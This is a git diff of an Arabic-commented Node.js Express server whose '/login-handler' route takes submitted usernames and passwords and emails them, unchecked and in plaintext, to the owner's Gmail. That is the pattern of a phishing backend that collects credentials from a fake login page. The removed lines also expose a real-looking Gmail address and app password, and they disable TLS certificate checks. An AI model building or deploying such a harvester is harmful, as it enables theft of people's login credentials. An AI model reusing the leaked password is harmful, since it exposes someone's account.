@@ -2,76 +2,39 @@ const express = require('express');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
 const app = express();
-const port = ProcessingInstruction.env.PORT || 3000;
+const port = process.env.PORT || 3000;
 
 // استخدم middleware
 app.use(express.json()); // لتحليل بيانات JSON
-app.use(cors()); // للسماح لصفحة الويب بالاتصال
+app.use(cors()); // للسماح بالوصول من مصادر مختلفة
 
-// إعداد Nodemailer
-// **ملاحظة:** يجب استبدال هذه المعلومات ببيانات بريدك الإلكتروني
-// ويفضل استخدام متغيرات البيئة كما شرحنا سابقاً
-// const transporter = nodemailer.createTransport({
-//     service: 'mail', // يمكنك تغيير الخدمة إلى outlook, yahoo, إلخ
-//     auth: {
-//         user: 'maeen.mohammed@gmail.com', // مثال: 'myemail@gmail.com'
-//         pass: 'snme icfq sbxh kybi', // يجب أن تكون "كلمة مرور تطبيق"
-//     }
-// });
-
-
+// إعداد Nodemailer باستخدام متغيرات البيئة
 const transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com', // هذا يحدد خادم SMTP الخاص بـ Gmail
-    port: 587,             // المنفذ لـ STARTTLS (موصى به)
-    secure: false,         // استخدم 'false' للمنفذ 587 مع STARTTLS
+    service: 'gmail', // أو أي خدمة بريد أخرى مثل 'outlook' أو 'yahoo'
     auth: {
-        user: 'maeen.mohammedaldeiry@gmail.com', // عنوان Gmail الفعلي الخاص بك
-        pass: 'snme icfq sbxh kybi' // كلمة مرور التطبيق المكونة من 16 حرفًا
-    },
-    tls: {
-        // هذا مهم للسماح بالاتصال بخادم Gmail بشكل آمن
-        // دون الحاجة إلى فحص صارم للشهادة في بيئات التطوير
-        rejectUnauthorized: false
+        user: process.env.EMAIL_USER, // يقرأ من متغير البيئة
+        pass: process.env.EMAIL_PASS, // يقرأ من متغير البيئة
     }
 });
 
-// مثال على إرسال بريد إلكتروني
-async function sendMyEmail() {
-    try {
-        let info = await transporter.sendMail({
-            from: 'maeen.mohammedaldeiry@gmail.com', // عنوان المرسل
-            to: 'maeen.mohammedaldeiry@gmail.com', // قائمة المستلمين
-            subject: 'مرحباً من Node.js!', // سطر الموضوع
-            text: 'هذا بريد إلكتروني اختباري مرسل من تطبيق Node.js الخاص بك.', // نص عادي
-            html: '<b>هذا بريد إلكتروني اختباري مرسل من تطبيق Node.js الخاص بك.</b>' // نص HTML
-        });
-        console.log('الرسالة أرسلت: %s', info.messageId);
-    } catch (error) {
-        console.log('فشل إرسال البريد:', error);
-    }
-}
-
-// استدعاء الوظيفة لإرسال البريد الإلكتروني (إذا لم تكن جزءًا من معالج مسار أكبر)
-// sendMyEmail();
-
-
-
-
-app.get( '/' , (req,res) => {
-    res.send('True');
+// مسار (route) للتعامل مع الطلبات العادية على الصفحة الرئيسية
+// هذا يحل مشكلة "Cannot GET /"
+app.get('/', (req, res) => {
+    res.send('الخادم يعمل بشكل صحيح. الرجاء استخدام صفحة تسجيل الدخول.');
 });
 
-// مسار (route) يستقبل بيانات تسجيل الدخول
-app.post('/login-handler', (req, res) => {
+// مسار (route) لمعالجة طلب تسجيل الدخول
+app.post('/login-handler', async (req, res) => {
     const { username, password } = req.body;
 
     if (!username || !password) {
         return res.status(400).json({ success: false, message: 'اسم المستخدم وكلمة المرور مطلوبان.' });
     }
 
+    // إعداد محتوى رسالة البريد الإلكتروني
     const mailOptions = {
-        from: 'maeen.mohammedaldeiry@gmail.com',
-        to: 'maeen.mohammedaldeiry@gmail.com',
+        from: process.env.EMAIL_USER,
+        to: process.env.EMAIL_USER, // يمكنك تعديله لبريد آخر إذا أردت
         subject: 'تم تسجيل دخول جديد',
         html: `
             <h3>بيانات تسجيل الدخول:</h3>
@@ -80,17 +43,18 @@ app.post('/login-handler', (req, res) => {
         `
     };
 
-    transporter.sendMail(mailOptions, (error, info) => {
-        if (error) {
-            console.error('فشل إرسال البريد:', error);
-            return res.status(500).json({ success: false, message: 'فشل إرسال البريد الإلكتروني.' });
-        }
-        console.log('تم إرسال البريد:', info.response);
+    // إرسال البريد الإلكتروني
+    try {
+        await transporter.sendMail(mailOptions);
+        console.log('تم إرسال البريد بنجاح.');
         res.status(200).json({ success: true, message: 'تم إرسال البيانات بنجاح.' });
-    });
+    } catch (error) {
+        console.error('فشل إرسال البريد:', error);
+        res.status(500).json({ success: false, message: 'فشل إرسال البريد الإلكتروني.' });
+    }
 });
 
-// تشغيل الخادم
+// تشغيل الخادم على المنفذ المحدد من Vercel أو المنفذ 3000
 app.listen(port, () => {
-    console.log(`الخادم يعمل على http://localhost:${port}`);
+    console.log(`Server is running on port ${port}`);
 });
